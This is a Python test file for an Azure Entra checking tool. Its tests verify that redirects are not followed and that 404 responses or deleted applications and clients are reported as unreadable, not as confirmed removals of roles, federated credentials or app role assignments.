def entra_plan_budget():
    from glorfindel.providers.azure.entra_items import PLAN_BUDGET_S
    return PLAN_BUDGET_S


def test_a_redirection_is_never_followed():
    r, s = _reader(_Resp(302, {}))
    with pytest.raises(Unreadable) as exc:
        r.get(f"/applications/{APP}")
    assert exc.value.kind == "error" and s.redirects is False


# ── Relecture 2 (05/11) : a 404 is never « removed » ──────────────────────────────────────────

def test_a_404_on_a_members_filtered_roles_is_unreadable_never_held(monkeypatch):
    """An unknown member is a 200 and an empty list: a 404 there says nothing of the member."""
    g = FakeGraph()
    monkeypatch.setattr(g, "list", lambda path, params=None, deadline=None: None)
    out = entra_check.check_item({"kind": "role_gone", "member": USER, "role_definition_id": ROLE_DEF,
                                  "eligible": False}, g)
    assert out["state"] == "unreadable"
    assert entra_check.check_item({"kind": "role_gone", "member": USER, "role_definition_id": ROLE_DEF,
                                   "eligible": False}, FakeGraph())["state"] == "held"    # 200, empty: held


def test_a_deleted_application_still_holds_its_federated_credential_for_all_we_know():
    """Deleted, an application is restored for 30 days with its credentials: unreadable, never held."""
    out = entra_check.check_item({"kind": "federated_gone", "id": APP, "fic_id": FIC}, FakeGraph())
    assert out["state"] == "unreadable" and "30 jours" in out["why"]


def test_a_deleted_client_still_holds_its_app_role_assignment_for_all_we_know():
    out = entra_check.check_item({"kind": "assignment_gone", "client": SP, "assignment_id": APP_ROLE_ASSIGNMENT},
                                 FakeGraph())
    assert out["state"] == "unreadable" and "30 jours" in out["why"]
